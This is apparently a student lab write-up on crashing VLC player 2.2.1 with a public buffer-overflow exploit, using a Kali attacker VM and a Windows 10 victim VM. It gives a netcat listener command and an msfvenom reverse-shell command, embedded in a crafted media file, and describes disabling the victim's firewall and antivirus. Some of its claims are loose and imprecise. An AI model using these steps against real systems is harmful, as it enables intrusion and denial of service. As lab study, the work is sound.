# VLC-exploitation-DOS-attack



**Introduction**

VLC player is an open source media player which is very famous around the world. It is developed by the VideoLan project which is supported by VideoLan organization based in France [1]. It is written using C (68.7%), C++ (18.4%), Objective-C (6.4%), Makefile (1.5%), Lua (1.3%), M4 (1.2%) [2] programming languages. Since C programming language has more vulnerabilities than any programming language, it is known as the most vulnerable language. Therefore, the VLC player has lots of vulnerabilities. Most of them are buffer overflow vulnerabilities. this document explains how to exploit VLC player version 2.2.1 and perform a DOS attack.

**The exploit**

There is a website called exploit-db which we can find exploits (Figure 1). We can search for VLC player exploits in exploit-db.

![](images/1.png)

_Figure 1 exploit-db VLC exploits_

I have found an exploit written using python 2 for VLC player verson 2.2.1 (Figure 2). It was written by SULTAN ALBALAWI. It is a DOS attack type buffer overflow and created on 2016-09-28. The exploit is EDB Verified. Which means it was successfully tested on their labs. EDB id is 40439.It was tested on windows 7 by the author. But I used windows 10 1909 latest version to exploit the media player.

![](images/2.png)

_Figure 2 The exploit written using python 2_

**Environment Setup**

First, we need to create two virtual machines. One for the attacker and one for the victim. My attackers VM is kali 2020 latest version and victims VM is windows 10 1909 latest. I have used Oracle VM to create these two virtual machines. After creating the VMs we need to create a network for these VMs to communicate with each other. For that we need to go to preferences on Oracle menu and then go to networks and then click add. We only needed to give the network ip address which we want to create and then tick the checkbox that saying support DHCP. After that we need to configure kali and windows vm network settings. Go to network and then select NAT network and then select the network that we created. After that we need to start these VMs then need to give them ip addresses. I gave 192.168.100.3 for Kali and 192.168.100.4 for windows. I didn&#39;t give any DNS IP address for windows because we didn&#39;t want it to connect to the internet but only to the Kali. For Kali I gave DNS address because I need it to be communicating with the internet. After that we need to disable windows auto update service and the Firewall and the Virus guard. Because we don&#39;t need to waste our data and the virus guard will delete our payload and firewall won&#39;t let us ping windows from Kali. After completing above steps, we need to ping each other to see if they can communicate with each other.

**Executing the exploit**

Before running the exploit, we only need the below script (Figure 3). We can remove other parts of the exploit.

![](images/3.png)

_Figure 3 The Payload_

We need to type below command in terminal to execute the exploit.

Python2 filename.py

This will create a media file in wmv format. This is our payload. We need to play this on windows 10 with VLC player version 2.2.1. Before playing it, we need to setup a listener on Kali for incoming request from windows. For this we use netcat. below is the command to create a listener. Figure 4 shows the netcat listening on port 8080.

nc -nvlp [port number]

![](images/4.png)

_Figure 4 netcat listner_

After that we need to play the payload media file. After opening the file with VLC, the player will automatically be closed after waiting for few seconds. we won&#39;t get any request to listener. Because we are testing this on windows 10. This buffer overflow vulnerability is DOS attack type. Therefore, we need to edit the payload to perform DOS attack. We need to create our own payload.

**Creating the Payload**

We need msfvenom to create payload. There are two types of payloads in msfvenom.

- Staged
- Unstaged

Staged means msfvenom only create partial of the payload. When executing it, it will create a connection to the attacker. Then the attacker sends the full payload. We need Metasploit multi handler to catch the revers shell for staged payloads. Unstaged means the full payload will be generated, but it will be larger in size than the staged payloads.

For this exploit we use unstaged payloads. we need to give port and IP address and payload location and format to msfvenom. Below is the command.

msfvenom -p windows/shell\_reverse\_tcp -f python LHOST=192.168.100.3 LPORT=8080

After that it will take some time to generate the payload. Below figure 5 shows the generated payload.

![](images/5.png)

_Figure 5 The Unstaged payload_

Above figure shows generated payload. We need to insert that to the exploit. We remove middle part of the payload and replace it with our payload. We keep first and last parts. Because we need make our payload readable to VLC player. Below figure 6 shows our final payload.

![](images/6.png)

_Figure 6 The Final Payload_

We need to execute it and get the payload media file. When the VLC player opens this media file, it will get crashed. Below figure 7 and 8 shows the crashed VLC player.

![](images/7.png)

_Figure 7 VLC DOS attack_

![](images/8.png)

_Figure 8 VLC Player not responding_

**Video Links**

Part 1 - [https://youtu.be/dMR2fpzm6R4](https://youtu.be/dMR2fpzm6R4)

Part 2 - [https://youtu.be/3htetul-5HA](https://youtu.be/3htetul-5HA)

Part 3 - [https://youtu.be/ySAbZ5SHmeY](https://youtu.be/ySAbZ5SHmeY)

Part 4 - [https://youtu.be/FKAW0LEeol0](https://youtu.be/FKAW0LEeol0)

Part 5 - [https://youtu.be/uN3vQpsCYUE](https://youtu.be/uN3vQpsCYUE)

**Reference**

[1] : https://www.videolan.org/videolan/

[2] : [https://www.quora.com/What-programming-language-is-use-for-creating-a-media-player-like-VideoLan-and-Media-Player-Classic](https://www.quora.com/What-programming-language-is-use-for-creating-a-media-player-like-VideoLan-and-Media-Player-Classic)

[3] : [https://www.exploit-db.com/exploits/40439](https://www.exploit-db.com/exploits/40439)

[4] : https://medium.com/@hakluke/haklukes-guide-to-hacking-without-metasploit-1bbbe3d14f90
